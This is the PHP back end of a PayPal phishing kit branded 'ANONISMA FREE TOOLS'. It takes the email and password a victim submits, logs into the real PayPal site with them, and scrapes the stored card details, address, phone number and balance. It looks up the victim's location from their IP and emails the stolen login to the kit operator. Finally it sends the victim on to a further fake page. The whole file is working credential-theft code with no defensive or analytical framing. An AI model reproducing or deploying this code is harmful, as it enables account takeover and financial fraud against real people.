<?php
error_reporting(0);
session_start();
set_time_limit(0);
$entrar   = (__DIR__);
$email    = $_SESSION['_email_']        = $_POST['EM'];
	if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
	}
$pwd      = $_SESSION['_password_']     = $_POST['PS'];
$hopl = "https://www.paypal.com/";
$Registro['cookie_file'] = $entrar . '/logs/' . sha1('R') . '.log';
$var                 = 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';
$Remplazar = @fopen($Registro['cookie_file'], 'w');
function curl($url = '', $var = '', $header = false, $nobody = false)
{
    global $Registro;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_REFERER, $hopl, 'webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit');
    curl_setopt($curl, CURLOPT_COOKIEFILE, $Registro['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $Registro['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function delete_cookies()
{
    global $Registro;
    @fclose($Remplazar);
}
function Error()
{
	$An = rand(15213546874653, 79854123154521879451);
	$Oni = md5(gmdate('r'));
	$Sma = $_SESSION['AYCOUNT'];
	$VFinal = $_SESSION['AYCOUNTCODE'];
	$x = "Error";
    $Fatal_Error = header("Location: ../error.php?_id=".$VFinal.$x.$An.$x.$Oni.$x.$Sma);

    return $Fatal_Error;
}
function inStr($s, $as)
{
    $s = strtoupper($s);
    if (!is_array($as))
        $as = array(
            $as
        );
    for ($Fatal_Error = 0; $Fatal_Error < count($as); $Fatal_Error++)
        if (strpos(($s), strtoupper($as[$Fatal_Error])) !== false)
            return true;
    return false;
}
if ((isset($_POST['EM'])) && (strlen($_POST['PS']) >= 8)) {
    delete_cookies();
    if (curl($hopl , '', true, true) === false) {
        continue;
    }
    $page  = curl("https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit", 'login_cmd=&login_params=&login_email=' . rawurlencode($email) . '&login_password=' . rawurlencode($pwd) . '&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows');
    $title = fetch_value($page, '<title>', '</title>');
    if (inStr($page, 's.prop14=')) {
        Error();
    } else {
                $ppcard    = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2");
                $checkcard = fetch_value($ppcard, 's.prop1="', '"');
                if (stripos($checkcard, 'ccadd') !== false) {
                    $_SESSION['_card_'] = $pp['card'] = "No Card";
                } else {
                    preg_match_all('/<tr>(.+)<\/tr>/siU', $ppcard, $matches);
                    $cc = array();
                    foreach ($matches[1] AS $k => $v) {
                        if ($k > 0) {
                            preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
                            $_SESSION['_cctype_'] = $type = strtoupper(fetch_value($m[1][0], '&#x2f;icon&#x5f;', '&#x2e;gif'));
                            $_SESSION['_ccnum_']  = $ccnum = $m[1][1];
                            $_SESSION['_ccexp_']  = $exp = $m[1][2];
                            if (stristr($m[1][4], 'complete_expanded_use.x')) {
                                $_SESSION['_card_confirmation'] = $confirmed = 'No Confirmed';
                            } else {
                                $_SESSION['_card_confirmation'] = $confirmed = 'Confirmed';
                            }
                            $cc[] = "<img src='./images/PPP.png' > $type  &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; $ccnum  $confirmed  <img src='./images/CCC.png' >  $exp";
                            $cc++;
                        } 
                    }
                    $_SESSION['_card_'] = $pp['card'] = "<font color=\"#\">" . implode("<br>", $cc) . "</font>";
                }
                $ppadd               = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3");
                $Fatal_ErrornfoAddr            = str_replace('<br>', ', ', fetch_value($ppadd, 'emphasis">', '</span>'));
                $_SESSION['_ad_']    = $pp['address'] = substr($Fatal_ErrornfoAddr, 0, -2);
                $response = curl('https://www.paypal.com/myaccount/home');
                $_SESSION['balance'] = $balance = fetch_value($response, 'class="vx_h2">', '</div>');
                $ppphone             = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4");
                $_SESSION['_phone_'] = $pp['phone'] = strip_tags('<input type="hidden" ' . fetch_value($ppphone, 'name="phone"', '</label>'));
/** 

----------------------------------------------------------------------------------------------------------------------	
     _      _   _    ___    _   _   ___   ____    __  __      _      
    / \    | \ | |  / _ \  | \ | | |_ _| / ___|  |  \/  |    / \     
   / _ \   |  \| | | | | | |  \| |  | |  \___ \  | |\/| |   / _ \    
  / ___ \  | |\  | | |_| | | |\  |  | |   ___) | | |  | |  / ___ \   
 /_/   \_\ |_| \_|  \___/  |_| \_| |___| |____/  |_|  |_| /_/   \_\_____ FREE TOOlS 2015-2016 ==> MA DZ TN V2
                                                                                                                                                                                       ----------------------------------------------------------------------------------------------------------------------	                                            
**/	
include('../../edit/bots.php');	
include('../../edit/______________email.php');	
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip . "");
$codecountryy      = $details->geoplugin_countryCode;
$smiyacountry = $details->geoplugin_countryName;
$codecountry = strtolower($codecountryy);
$cartamensaje = "<!DOCTYPE html><html> <head> 
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> 
    <meta name=\"viewport\" content=\"width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;\"> 
    <style type=\"text/css\">body { width: 100% !important;}</style> 
  </head> 
  <body class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"   style=\"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #e9e9e9\"> 
    <table class=\" ".md5(gmdate('r'))." \" style=\"WIDTH: 100%\"> 
      <tbody class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"  > 
        <tr class=\" ".md5(gmdate('r'))." \"> 
          <td  for=\" ".md5(gmdate('r'))." \"  style=\" BACKGROUND-COLOR: #e9e9e9\" align=\"center\"> 
            <table class=\" ".md5(gmdate('r'))." \" width=\"600\" border=\"0\"> 
              <tbody class=\" ".md5(gmdate('r'))." \"> 
                <tr> 
                  <td class=\" ".md5(gmdate('r'))." \"> 
                    <div class=\" ".md5(gmdate('r'))." \"> 
                      <table class=\" ".md5(gmdate('r'))." \" for=\" ".md5(gmdate('r'))." \"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                        <tbody  for=\"". rand(99999999999, 999999999999999999999999)."\"  > 
                          <tr class=\" ".md5(gmdate('r'))." \"> 
                            <td class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius: 10px 10px 0px 0px\"> 
                              <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                                <tbody> 
                                  <tr> 
                                    <td class=\" ".md5(gmdate('r'))." \"> 
                                      <div class=\" ".md5(gmdate('r'))." \" id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"LINE-HEIGHT: 30px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
                                        <p> 
                                        <div class=\" ".md5(gmdate('r'))." \"  for=\" ".md5(gmdate('r'))." \"   style=\"FONT-SIZE: 10px; FONT-FAMILY: Arial black; COLOR: #828282;\" > 
                                          <p style=\"FONT-SIZE: 27px\"><strong><font color=\"#7E7E7E\"> \ ◇ ◇ ◇  <font size=\"6\">☠</font> MA DZ TN <font size=\"6\">☠</font>  ◇ ◇ ◇  / </font></strong> 
                                          </p> 
                                        </div> 
                                        </p> 
                                      </div> 
                                    </td> 
                                  </tr> 
                                </tbody> 
                              </table> 
                            </td> 
                          </tr> 
                        </tbody> 
                      </table> 
                    </div> 
                    <div> 
                    <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                      <tbody class=\" ".md5(gmdate('r'))." \"> 
                        <tr> 
                          <td class=\" ".md5(gmdate('r'))." \" style=\" BACKGROUND: #F5F5F5 ; LINE-HEIGHT: 22px;border-top:2px solid #7E7E7E\"> 
                            <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                              <tbody> 
                                <tr> 
                                  <td> 
                                    <div class=\" ".md5(gmdate('r'))." \"  for=\" ".md5(gmdate('r'))." \"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
                                    <b><font color=\"#7E7E7E\">★ PAYPAL LOGIN ACCOUNT ★</font></b> 
                                  </td> 
                                </tr> 
                                <tr class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
                                  <td> 
                                    <div  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
                                     " .$_POST['EM']." 
                                    </div> 
                                    <div class=\" ".md5(gmdate('r'))." \" for=\" ".md5(gmdate('r'))." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 5px 0px 4px 0px\">						   
                                     " .$_POST['PS']." 
                                    </div> 
                                  </td> 
                                </tr> 
                                <tr class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
                                  <td> 
                                    <div  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
                                      " .$smiyacountry." 
                                    </div> 
                                  </td> 
                                </tr>  					   
                              </tbody> 
                            </table> 
                          </td> 
                        </tr> 
                      </tbody> 
                    </table> 
                    </div> 
                    <div> 
                      <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                        <tbody class=\" ".md5(gmdate('r'))." \"> 
                          <tr> 
                            <td class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 27px\"> 
                              <table  for=\"". rand(99999999999, 999999999999999999999999)."\"   width=\"600\" align=\"left\" border=\"0\"> 
                                <tbody class=\" ".md5(gmdate('r'))." \"> 
                                  <tr> 
                                    <!-- -->							   
                                  </tr> 
                                </tbody> 
                              </table> 
                            </td> 
                          </tr> 
                        </tbody> 
                      </table> 
                    </div> 
                    <div class=\" ".md5(gmdate('r'))." \"> 
                    <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                      <tbody> 
                        <tr> 
                          <td class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius:0px 0px 10px 10px\"> 
                            <table class=\" ".md5(gmdate('r'))." \" cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                              <tbody> 
                                <tr class=\" ".md5(gmdate('r'))." \"> 
                                  <td> 
                                    <div class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\"FONT-SIZE: 9px; FONT-FAMILY: Arial; COLOR: #747474;margin-left:30px;margin-right:30px\"> 
                                      <hr size=\"2\" color=\"#F0F0F0\" width=\"100%\"> 
                                      <p align=\"center\" > 
                                        ---- | ★ ★ ★ ANONISMA FREE TOOLS ★ ★ ★ | ---- 
                                      </p> 
                                  </td> 
                                </tr> 
                              </tbody> 
                            </table> 
                          </td> 
                        </tr> 
                      </tbody> 
                    </table> 
                    </div> 
                  </td> 
                </tr> 
                <tr class=\" ".md5(gmdate('r'))." \"> 
                  <td class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" PADDING-TOP: 10px; \" align=\"center\"> 
                    <div class=\" ".md5(gmdate('r'))." \" align=\"center\" style=\"FONT-SIZE: 11px; FONT-FAMILY: Arial; COLOR: #959595;\"> 
                      <p> 
                        بعيدا عن السبام 
                        <br> 
                        سهر + برمجة + سكريبتات + الشبكات + تواضع = صرف و إحترام 
                        <br> 
                        تدوين + تقنية + ربح + بلوكر= شاعر معلوماتي عباد االأسهم  
                        <br> 
                        الجديد إصنعه بيدك لنغير سلوكنا 
                      </p> 
                    </div> 
                  </td> 
                </tr> 
              </tbody> 
            </table> 
          </td> 
        </tr> 
      </tbody> 
    </table> 
  </body> 
</html>";
$subject = "LOGIN / EMAIL / PASSD / =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ";
$headers = "From: ANONISMA SMART <hema.sehs50@gmail.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($enviardatos,$subject,$cartamensaje,$headers);							 
//----------------------------------------------------------------------------ANONISMA FREE TOOLS 2015-2016 

	$An		 = rand(999999999999999999, 999999999999999999999999999);
	$Oni	 = md5(gmdate('r'));
	$Sma 	 = $details->geoplugin_countryName;
	$VFinal	 = $details->geoplugin_countryCode;
	$xx 	 = "_";
	$idd 	 = rand(9999, 999999);
    echo "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
<script language=\"javascript\"> 
var page = \"../account.php?id=.$idd.$VFinal.$xx.$An.$xx.$Oni.$xx.$Sma\"           
top.location = page; 
</script>  
</head> 
</html>\n"; 
            }
    }
	else {
    Error();
}
?>